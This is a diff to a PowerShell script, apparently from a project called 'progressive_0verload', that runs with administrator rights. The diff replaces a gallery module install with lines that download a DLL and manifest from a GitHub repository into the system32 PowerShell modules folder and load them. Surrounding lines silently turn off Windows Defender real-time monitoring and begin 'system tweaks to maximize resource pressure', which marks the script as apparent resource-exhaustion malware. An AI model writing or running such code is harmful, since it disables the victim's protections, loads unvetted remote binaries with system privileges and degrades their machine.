@@ -13,9 +13,14 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     exit
 }
 
-Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force -Confirm:$false
-Install-Module -Name ThreadJob -Force -Scope CurrentUser -AllowClobber -Confirm:$false 
-Import-Module ThreadJob -Force
+# Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force -Confirm:$false
+# Install-Module -Name ThreadJob -Force -Scope CurrentUser -AllowClobber -Confirm:$false 
+
+$moduleDir = "$env:windir\system32\WindowsPowerShell\v1.0\Modules\Microsoft.PowerShell.ThreadJob\2.2.0"
+if(-not(Test-Path -Path $moduleDir -PathType Container)){ New-Item -Path $moduleDir -ItemType Directory -Force | Out-Null }
+iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/Microsoft.PowerShell.ThreadJob.psd1" -OutFile "$moduleDir\Microsoft.PowerShell.ThreadJob.psd1"
+iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/Microsoft.PowerShell.ThreadJob.dll" -OutFile "$moduleDir\ThreadJob.dll"
+Import-Module Microsoft.PowerShell.ThreadJob -Force
 
 try{Set-MpPreference -DisableRealtimeMonitoring $true} catch{}
 # --- System Tweaks to maximize resource pressure ---
